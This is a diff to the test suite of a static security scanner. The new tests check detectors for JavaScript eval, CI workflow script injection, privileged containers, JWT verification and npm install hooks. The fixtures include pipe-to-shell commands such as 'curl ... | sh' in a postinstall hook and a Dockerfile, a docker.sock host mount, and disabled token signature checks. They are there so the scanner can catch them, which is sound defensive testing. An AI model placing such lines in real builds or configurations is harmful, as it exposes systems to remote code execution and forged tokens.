@@ -21,6 +21,7 @@ ROOT = Path(__file__).resolve().parent
 SCRIPTS = ROOT / "scripts"
 sys.path.insert(0, str(SCRIPTS))
 import score as cli  # noqa: E402
+import score_architecture as architecture  # noqa: E402
 import score_core as core  # noqa: E402
 import score_sources as sources  # noqa: E402
 import score_remote as remote  # noqa: E402
@@ -420,13 +421,314 @@ class ScoreTests(unittest.TestCase):
 
     def test_ambiguous_template_regex_and_incomplete_templates_fail_closed(self):
         for source in (
-            "const x = `${ /}/.test(x) ? eval(x) : 1 }`;",
+            "const x = `${ (/}) ? eval(x) : 1 }`;",
             "const x = `${eval(x)",
         ):
             self.write("app.js", "JSON.parse(data);\n" + source)
             status, result, _ = self.invoke()
             self.assertEqual(status, 1)
             self.assertIsNone(result["score"])
+
+    def test_regex_literals_are_masked_without_hiding_code(self):
+        for source, rule, count in (
+            ("text.replace(/'/g, '');\neval(input);", "JS-EVAL", 1),
+            ("const pattern = /[/'\"]/g;\neval(input);", "JS-EVAL", 1),
+            ("const pattern = /eval(input)/;", "JS-EVAL", 0),
+            ('function quoted(v) { return /"/.test(v) }\neval(input);', "JS-EVAL", 1),
+            ("const test = v => /'/.test(v);\neval(input);", "JS-EVAL", 1),
+            ("const half = total / 2; const q = 'a';\neval(input);", "JS-EVAL", 1),
+            ("count++ / 2; eval(input) / 3;", "JS-EVAL", 1),
+            ("let of = 4; of / 2; eval(input) / 3;", "JS-EVAL", 1),
+            ("const s = `${Math.floor(code / 100)}XX`;\neval(input);", "JS-EVAL", 1),
+            ("const s = `${/}/.test(x) ? eval(x) : 1}`;", "JS-EVAL", 1),
+            (
+                "return <p></p><div dangerouslySetInnerHTML={{__html: v}} />;",
+                "FRONTEND-BINDING",
+                1,
+            ),
+        ):
+            with self.subTest(source=source):
+                findings, checks = core.scan(
+                    {"app.jsx": {"text": source}}, sources.Budget()
+                )
+                self.assertFalse(any(row.get("error") for row in checks))
+                self.assertEqual(sum(row["rule"] == rule for row in findings), count)
+
+    def test_lexer_and_new_detectors_stay_linear_on_adversarial_input(self):
+        size = 128 * 1024
+        for path, source in (
+            ("app.js", "x = " + "/[" * (size // 2)),
+            ("app.js", "a" * size + " / b"),
+            ("app.js", "algorithms: [" * (size // 13)),
+            (".github/workflows/a.yml", "run: " + "${{" * (size // 3)),
+            ("requirements.txt", "a==1 \\\n" * (size // 7)),
+            ("Dockerfile", "RUN curl \\\n" * (size // 11)),
+        ):
+            with self.subTest(path=path, start=source[:12]):
+                started = time.monotonic()
+                core.scan({path: {"text": source}}, sources.Budget(60))
+                self.assertLess(time.monotonic() - started, 10)
+
+    def test_corrected_detectors_avoid_known_false_results(self):
+        digest = "a" * 64
+        for path, source, rule, status in (
+            (
+                "app.js",
+                "await page.$$eval('li', items => items.length);",
+                "JS-EVAL",
+                "not_applicable",
+            ),
+            ("app.js", "obj.eval(payload);", "JS-EVAL", "violated"),
+            (
+                "app.jsx",
+                "items.map(i => <li key={Math.random()}>{i}</li>);",
+                "JS-RANDOM",
+                "not_applicable",
+            ),
+            (
+                "app.js",
+                "const apiKey = Math.random().toString(36);",
+                "JS-RANDOM",
+                "violated",
+            ),
+            ("app.js", "if (el.innerHTML == expected) {}", "JS-HTML", "not_applicable"),
+            ("app.js", "document.writeln(markup);", "JS-HTML", "violated"),
+            (
+                "app.js",
+                "process.env.NODE_TLS_REJECT_UNAUTHORIZED = setting;",
+                "JS-TLS",
+                "unclear",
+            ),
+            (
+                "Dockerfile",
+                f"FROM node@sha256:{digest} AS base\nFROM base\nFROM python:3",
+                "IAC-IMAGE",
+                "violated",
+            ),
+            ("app.Dockerfile", "FROM node:latest", "IAC-IMAGE", "violated"),
+            (
+                "requirements.txt",
+                "--trusted-host packages.example.invalid",
+                "PY-DEPENDENCIES",
+                "violated",
+            ),
+            (
+                "requirements.txt",
+                f"-e git+https://example.invalid/x.git@{'b' * 40}#egg=x",
+                "PY-DEPENDENCIES",
+                "unclear",
+            ),
+            (
+                "requirements.txt",
+                "-i https://packages.example.invalid/simple",
+                "PY-DEPENDENCIES",
+                "unclear",
+            ),
+            (
+                "requirements.txt",
+                "example==1.0 # --hash=sha256:" + digest,
+                "PY-DEPENDENCIES",
+                "unclear",
+            ),
+            (
+                "headers.py",
+                "response.headers['Content-Security-Policy'] = \"script-src 'nonce-x' 'unsafe-eval'\"",
+                "WEB-CSP",
+                "violated",
+            ),
+            (
+                "headers.py",
+                "response.headers['Content-Security-Policy'] = \"script-src 'strict-dynamic' 'unsafe-inline'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'\"",
+                "WEB-CSP",
+                "satisfied",
+            ),
+            ("app.py", "subprocess.getoutput(command)", "PY-SHELL", "violated"),
+            ("app.py", "yaml.safe_load_all(stream)", "PY-YAML", "satisfied"),
+            ("app.py", "context.check_hostname = setting", "PY-TLS", "unclear"),
+            ("app.py", "httpx.AsyncClient()", "PY-TLS", "satisfied"),
+        ):
+            with self.subTest(path=path, source=source):
+                _, checks = core.scan({path: {"text": source + "\n"}}, sources.Budget())
+                self.assertEqual(
+                    next(row for row in checks if row["rule"] == rule)["status"], status
+                )
+
+    def test_workflow_rules_need_untrusted_text_in_executed_scripts(self):
+        workflow = ".github/workflows/check.yml"
+        for source, rule, lines in (
+            (
+                'steps:\n  - run: |\n      echo ok\n      echo "${{ github.event.pull_request.title }}"\n  - run: echo done\n',
+                "CI-SCRIPT-INJECTION",
+                [4],
+            ),
+            (
+                "steps:\n  - uses: actions/github-script@"
+                + "a" * 40
+                + "\n    with:\n      script: |\n        core.info('${{ github.event.comment.body }}')\n",
+                "CI-SCRIPT-INJECTION",
+                [5],
+            ),
+            (
+                "steps:\n  - if: contains(github.event.issue.title, 'x')\n    run: echo hi\n",
+                "CI-SCRIPT-INJECTION",
+                [],
+            ),
+            (
+                "steps:\n  - run: echo ${{ github.event.release.tag_name }} ${{ github.sha }}\n",
+                "CI-SCRIPT-INJECTION",
+                [],
+            ),
+            (
+                "steps:\n  # - run: echo ${{ github.event.issue.title }}\n  - run: echo hi\n",
+                "CI-SCRIPT-INJECTION",
+                [],
+            ),
+            (
+                "steps:\n  - run: echo github.event.issue.title\n",
+                "CI-SCRIPT-INJECTION",
+                [],
+            ),
+            (
+                "on:\n  workflow_run:\n    workflows: [ci]\njobs:\n  a:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.workflow_run.head_sha }}\n",
+                "CI-PR-HEAD-CHECKOUT",
+                [9],
+            ),
+            (
+                "on: pull_request_target\njobs:\n  a:\n    steps:\n      - run: gh pr checkout ${{ github.event.number }}\n",
+                "CI-PR-HEAD-CHECKOUT",
+                [5],
+            ),
+            (
+                "on: [pull_request_target]\njobs:\n  a:\n    steps:\n      - uses: actions/checkout@v4\n",
+                "CI-PR-HEAD-CHECKOUT",
+                [],
+            ),
+            (
+                "on: push\njobs:\n  a:\n    if: github.event_name == 'pull_request_target'\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.head_ref }}\n",
+                "CI-PR-HEAD-CHECKOUT",
+                [],
+            ),
+        ):
+            with self.subTest(source=source):
+                findings, _ = core.scan({workflow: {"text": source}}, sources.Budget())
+                self.assertEqual(
+                    [row["line"] for row in findings if row["rule"] == rule], lines
+                )
+
+    def test_container_privileges_need_explicit_settings(self):
+        for path, source, status in (
+            (
+                "deploy/pod.yaml",
+                "securityContext:\n  privileged: true  # needed\n",
+                "violated",
+            ),
+            ("pod.yaml", "spec:\n  hostPID: yes\n", "violated"),
+            (
+                "pod.yaml",
+                "volumes:\n  - hostPath:\n      path: /var/run/docker.sock\n",
+                "violated",
+            ),
+            (
+                "compose.yaml",
+                'services:\n  app:\n    network_mode: "host"\n',
+                "violated",
+            ),
+            ("values.yaml", "privileged:\n  enabled: true\n", "not_applicable"),
+            ("values.yaml", "# privileged: true\n", "not_applicable"),
+            (
+                "values.yaml",
+                "securityContext:\n  privileged: ${PRIVILEGED}\n",
+                "unclear",
+            ),
+            (
+                "Dockerfile",
+                "RUN set -eux; \\\n  # installer\n  curl -sSL https://example.invalid/i.sh \\\n  | sudo -E bash -\n",
+                "violated",
+            ),
+            (
+                "Dockerfile",
+                "# RUN curl https://example.invalid/i.sh | sh\n",
+                "not_applicable",
+            ),
+            ("Dockerfile", "ADD http://example.invalid/tool.tgz /opt/\n", "violated"),
+            (
+                "Dockerfile",
+                f"ADD https://example.invalid/x.git#{'a' * 40} /src\n",
+                "satisfied",
+            ),
+        ):
+            with self.subTest(path=path, source=source):
+                _, checks = core.scan({path: {"text": source}}, sources.Budget())
+                rules = {"IAC-PRIVILEGED", "IAC-REMOTE-SCRIPT", "IAC-ADD-URL"}
+                outcomes = {row["status"] for row in checks if row["rule"] in rules} - {
+                    "not_applicable"
+                }
+                self.assertEqual(outcomes or {"not_applicable"}, {status})
+
+    def test_token_verification_options_must_be_literal(self):
+        for path, source, status in (
+            (
+                "auth.py",
+                "ALGORITHM = 'HS256'\nALGORITHM = choose()\njwt.decode(t, k, algorithms=[ALGORITHM])\n",
+                "unclear",
+            ),
+            (
+                "auth.py",
+                "jwt.decode(t, k, algorithms=['HS256'], options=settings)\n",
+                "unclear",
+            ),
+            (
+                "auth.py",
+                "jwt.decode(t, k, algorithms=['HS256'], options={'verify_exp': False})\n",
+                "violated",
+            ),
+            ("auth.py", "jwt.decode(t, k, verify=False)\n", "violated"),
+            ("auth.py", "jose.jwt.decode(t, k, algorithms=('RS256',))\n", "satisfied"),
+            (
+                "auth.js",
+                "jwt.verify(t, k, { algorithms: ['HS256'], ignoreExpiration: true });\n",
+                "violated",
+            ),
+            (
+                "auth.js",
+                "jwt.verify(t, k, { algorithms: ['RS256' /* , 'none' */] });\n",
+                "unclear",
+            ),
+            (
+                "auth.js",
+                "jwt.verify(t, k, { algorithms: ['NONE', 'RS256'] });\n",
+                "violated",
+            ),
+            (
+                "auth.js",
+                "const note = \"{ algorithms: ['none'] }\";\n",
+                "not_applicable",
+            ),
+        ):
+            with self.subTest(source=source):
+                _, checks = core.scan({path: {"text": source}}, sources.Budget())
+                self.assertEqual(
+                    next(row for row in checks if row["rule"].endswith("-JWT"))[
+                        "status"
+                    ],
+                    status,
+                )
+
+    def test_token_verification_assesses_the_authentication_topic(self):
+        self.write("auth.py", "claims = jwt.decode(token, key, algorithms=['RS256'])\n")
+        status, result, _ = self.invoke()
+        self.assertEqual(status, 0)
+        topics = {topic["id"]: topic for topic in reporting.subcategories(result)}
+        self.assertEqual(topics["authentication"]["index"], 100)
+        self.write(
+            "auth.py",
+            "claims = jwt.decode(token, options={'verify_signature': False})\n",
+        )
+        _, result, _ = self.invoke()
+        self.assertEqual(result["score"], 59)
+        self.assertEqual(
+            {row["area"] for row in result["findings"]}, {"authentication"}
+        )
 
     def test_severity_policy_rejects_inverted_weights_and_caps(self):
         import score_calculation as calculation
@@ -1147,7 +1449,7 @@ class ScoreTests(unittest.TestCase):
             "app.py", "eval(payload)\neval(other)\ncursor.execute('SELECT ' + value)\n"
         )
         self.write("safe.js", "element.textContent = payload;\n")
-        self.write("Dockerfile", "USER app\n")
+        self.write("compose.yaml", "services:\n  app:\n    privileged: false\n")
         _, result, _ = self.invoke()
         topics = {topic["id"]: topic for topic in reporting.subcategories(result)}
         self.assertEqual(topics["architecture"]["index"], 50)
@@ -1347,30 +1649,49 @@ class ScoreTests(unittest.TestCase):
         )
 
     def test_supply_chain_declarations_and_stale_locks(self):
-        self.write("package.json", '{"dependencies":{"example":"1.0.0"}}')
-        self.write(
-            "package-lock.json",
-            '{"lockfileVersion":3,"packages":{"":{"dependencies":{"example":"1.0.0"}}}}',
+        lock = (
+            '{"lockfileVersion":3,"packages":{"":{"dependencies":{"example":"1.0.0"}}}}'
         )
-        result = self.invoke()[1]
-        self.assertEqual(
-            next(row for row in result["checks"] if row["rule"] == "NPM-LOCK")[
-                "status"
-            ],
-            "satisfied",
-        )
+        for manifest, status in (
+            ('{"dependencies":{"example":"1.0.0"}}', "satisfied"),
+            ('{"dependencies":{"example":"2.0.0"}}', "unclear"),
+        ):
+            # The disabled NPM-LOCK detector stays correct for reactivation.
+            self.assertEqual(
+                architecture.npm_observations(
+                    "npm-lock",
+                    "package.json",
+                    manifest,
+                    {"package-lock.json": {"text": lock}},
+                ),
+                [(1, status)],
+            )
         self.write(
             "package.json",
             '{"dependencies":{"example":"2.0.0"},"scripts":{"postinstall":"curl https://example.invalid/setup | sh"}}',
         )
+        self.write("package-lock.json", lock)
         result = self.invoke()[1]
-        self.assertEqual(
-            next(row for row in result["checks"] if row["rule"] == "NPM-LOCK")[
-                "status"
-            ],
-            "unclear",
-        )
         self.assertIn("NPM-INSTALL", {row["rule"] for row in result["findings"]})
+
+    def test_disabled_rules_keep_their_id_but_never_run(self):
+        disabled = {
+            rule["id"]
+            for rule in core.POLICY["rules"]
+            if rule.get("enabled", True) is False
+        }
+        self.assertEqual(disabled, {"IAC-USER", "NPM-LOCK"})
+        self.assertFalse(disabled & {rule["id"] for rule in core.RULES})
+        self.write("Dockerfile", "FROM scratch\nUSER root\n")
+        self.write("package.json", '{"dependencies":{"example":"1.0.0"}}')
+        result = self.invoke()[1]
+        self.assertFalse(disabled & {row["rule"] for row in result["checks"]})
+        with mock.patch.dict(core.POLICY["rules"][0], {"enabled": "no"}):
+            with self.assertRaisesRegex(ValueError, "enabled flag"):
+                core.validate_policy()
+        with mock.patch.dict(core.POLICY["rules"][0], {"id": "IAC-USER"}):
+            with self.assertRaisesRegex(ValueError, "unique"):
+                core.validate_policy()
 
     def test_complete_skill_copy_runs_without_analyzer_or_packages(self):
         import shutil
@@ -1545,7 +1866,7 @@ class ScoreTests(unittest.TestCase):
         self.write("app.py", source.replace("return actor == owner", "return True"))
         status, result, _ = self.invoke("--worktree")
         self.assertEqual(status, 0)
-        self.assertEqual(result["relevance_version"], 4)
+        self.assertEqual(result["relevance_version"], 5)
         self.assertEqual(result["relevance"], "high")
         self.assertEqual(result["findings"], [])
         self.assertTrue(
